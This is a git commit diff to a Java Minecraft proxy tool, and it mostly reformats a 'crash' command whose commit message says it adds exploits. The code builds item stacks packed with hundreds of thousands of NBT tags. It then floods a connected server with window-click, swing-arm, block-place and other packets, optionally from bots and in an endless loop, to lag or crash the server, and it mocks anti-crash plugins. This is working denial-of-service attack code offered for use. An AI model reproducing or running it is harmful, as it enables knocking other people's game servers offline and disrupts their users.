efff339140c8f934cf4e72c6bd3c0fbcf90187ce
yooniks <yooniksyooniks@gmail.com>
2018-02-25 13:42:54 +0100

    a little changes and added 2 exploits

--- src/main/java/xyz/yooniks/cproxy/command/commands/CrashCommand.java
+++ src/main/java/xyz/yooniks/cproxy/command/commands/CrashCommand.java
@@ -24,63 +24,60 @@ import java.util.List;
 public class CrashCommand extends Command {
 
     private static CrashCommand instance;
-
-    public static CrashCommand getInstance() {
-        return instance;
-    }
-
     private ItemStack isBeacon;
     private ItemStack isBook;
     private ItemStack isByte;
-
     public CrashCommand() {
         super("crash", "Zlaguj serwer!", ",crash [ilosc pakietow] [boty/gracz-true/false] [infinite-true/false] [odstep w sek] &a[&atype&a (swingarm,windowclick,blockplace,setcreativeslot,helditem) [item: beacon/book/byte] ",
                 Group.GRACZ, "krasz", "lag");
         instance = this;
         //if (true) {
-            final CompoundTag nbtB = new CompoundTag("display");
-            final List<Tag> tagsB = new ArrayList<>();
-            //for (int i = 0; i < 400000; i++)
-            for (int i = 0; i < 500000; i++)
-                tagsB.add(new StringTag("-________- jebac xprotector"));
-            final ListTag listTagB = new ListTag("Lore", tagsB);
-            isBeacon = new ItemStack(137, 64, 0, nbtB);
-            isBeacon.getNBT().put(listTagB);
+        final CompoundTag nbtB = new CompoundTag("display");
+        final List<Tag> tagsB = new ArrayList<>();
+        //for (int i = 0; i < 400000; i++)
+        for (int i = 0; i < 500000; i++)
+            tagsB.add(new StringTag("-________- jebac xprotector"));
+        final ListTag listTagB = new ListTag("Lore", tagsB);
+        isBeacon = new ItemStack(137, 64, 0, nbtB);
+        isBeacon.getNBT().put(listTagB);
         // }
 
         //if (true) {
         final CompoundTag nbt2 = new CompoundTag("ench");
         final List<Tag> tags2 = new ArrayList<>();
-            for (int i = 0; i < 10000; i++)
-                tags2.add(new StringTag("-________- jebac antycrasherki"));
+        for (int i = 0; i < 10000; i++)
+            tags2.add(new StringTag("-________- jebac antycrasherki"));
         final ListTag listTag2 = new ListTag("pages", tags2);
         isBook = new ItemStack(386, 64, 0, nbt2);
         isBook.getNBT().put(listTag2);
         //}
         //if (true){
-            final CompoundTag nbt= new CompoundTag("ench");
-            final List<Tag> tags = new ArrayList<>();
-            for (int i = 0; i < 20000; i++)
-                tags.add(new ByteTag("END"));
-            final ListTag listTag = new ListTag("END", tags);
-            isByte= new ItemStack(386, 64, 0, nbt);
-            isByte.getNBT().put(listTag);
+        final CompoundTag nbt = new CompoundTag("ench");
+        final List<Tag> tags = new ArrayList<>();
+        for (int i = 0; i < 20000; i++)
+            tags.add(new ByteTag("END"));
+        final ListTag listTag = new ListTag("END", tags);
+        isByte = new ItemStack(386, 64, 0, nbt);
+        isByte.getNBT().put(listTag);
         //}
+    }
+
+    public static CrashCommand getInstance() {
+        return instance;
     }
 
     @Override
     public void onCommand(Player p, Command command, String[] args) {
 
         //testy
-        if (args.length == 2){
-            if (p.getSessionConnect()!=null){
+        if (args.length == 2) {
+            if (p.getSessionConnect() != null) {
                 p.sendMessage("$p &aWysylam...");
                 final int am = Integer.parseInt(args[1]);
                 for (int i = 0; i < am; i++)
                     p.getSessionConnect().send(new ClientWindowActionPacket(0, 1, 1, isByte,
                             WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK));
-            }
-            else{
+            } else {
                 p.sendMessage("$p &cNie jestes polaczony z zadnym serwerem!");
             }
             return;
@@ -101,19 +98,17 @@ public class CrashCommand extends Command {
             final String item = args[6];
             final CrashType crashType;
             //troche pojebane
-            if (args[5].contains("swingarm") || args[5].contains("armanimation")){
-                crashType=CrashType.SWINGARM;
-            }
-            else if (args[5].contains("windowclick") || args[5].contains("window")){
-                crashType=CrashType.WINDOW;
-            }
-            else if (args[5].contains("place")||args[5].contains("blockplace")){
-                crashType=CrashType.PLACE;
+            if (args[5].contains("swingarm") || args[5].contains("armanimation")) {
+                crashType = CrashType.SWINGARM;
+            } else if (args[5].contains("windowclick") || args[5].contains("window")) {
+                crashType = CrashType.WINDOW;
+            } else if (args[5].contains("place") || args[5].contains("blockplace")) {
+                crashType = CrashType.PLACE;
             } else if (args[5].contains("helditem") || args[5].contains("changehelditem") || args[5].contains("slotchange")) {
                 crashType = CrashType.CHANGE_HELD_ITEM;
             } else if (args[5].contains("setcreativeslot") || args[5].contains("creativewindowclick")) {
                 crashType = CrashType.SET_CREATIVE_SLOT;
-            } else{
+            } else {
                 p.sendMessage("$p &cNieodpowiedni typ crashera. Typy crashera: &7swingarm, windowclick, blockplace, setcreativeslot, helditem");
                 return;
             }
@@ -124,7 +119,7 @@ public class CrashCommand extends Command {
                 }
             }
             p.sendMessage("$p &7Proba crashowania metoda &a" + crashType.name()
-                    +"&7, &7ilosc pakietow: &a" + args[1] + "&7, sesje: &a" + (bots ? "boty" : "gracz"));
+                    + "&7, &7ilosc pakietow: &a" + args[1] + "&7, sesje: &a" + (bots ? "boty" : "gracz"));
             if (infinite) {
                 final Thread t = new Thread(() -> {
                     //troche pojebane
@@ -215,18 +210,18 @@ public class CrashCommand extends Command {
                     packet = new ClientSwingArmPacket();
 
                 if (bots)
-                    crashBots(p, packets,packet);
+                    crashBots(p, packets, packet);
                 else
-                    crash(p, packets,packet);
+                    crash(p, packets, packet);
             }
         }
     }
 
-    private void crash(Player p, Integer packets,Packet packet) {
+    private void crash(Player p, Integer packets, Packet packet) {
         for (int i = 0; i < packets; i++) {
             if (!p.isConnected() || p.getSessionConnect() == null) break;
             //p.getSessionConnect().send(new ClientWindowActionPacket(0, 1, 1, is,
-             //       WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK));
+            //       WindowAction.CLICK_ITEM, ClickItemParam.LEFT_CLICK));
             p.getSessionConnect().send(packet);
         }
     }
